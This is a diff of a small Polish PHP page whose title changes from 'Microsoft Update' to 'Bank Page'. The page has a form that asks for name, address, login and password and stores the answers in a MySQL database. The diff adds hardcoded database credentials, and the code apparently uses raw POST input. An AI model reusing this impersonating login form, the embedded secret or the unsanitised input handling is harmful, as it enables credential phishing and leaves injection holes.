@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-    <title>Microsoft Update</title>
+    <title>Strona Banku</title>
 	<meta charset="utf-8" />
 </head>
 <body>
@@ -32,11 +32,11 @@ address<br><input type="text" name="address"><br><br>
 login<br><input type="text" name="login"><br><br>
 password<br><input type="text" name="password"><br><br>
 
-<input type="submit" name="co" value="Potwierdz">
+<input type="submit" name="co" value="Potwierdź">
 </form>
 
 <?php 
-$conn=@mysqli_connect("localhost","login","haslo","baza");
+$conn=@mysqli_connect("localhost","turboreal","zaq1@WSX","turboreal");
 if(!$conn) die('Brak polaczenia z serwerem');
 
 $name =$_POST['name'];
@@ -83,6 +83,8 @@ if($wynik->num_rows>0)
 	echo('</table>');
 }
 ?>
+<div id="cinkciarzPlWidgetNbp"></div>
+<script src="https://cinkciarz.pl/widget/cinkciarz.widget.js"></script>
 </body>
 </html>
 	
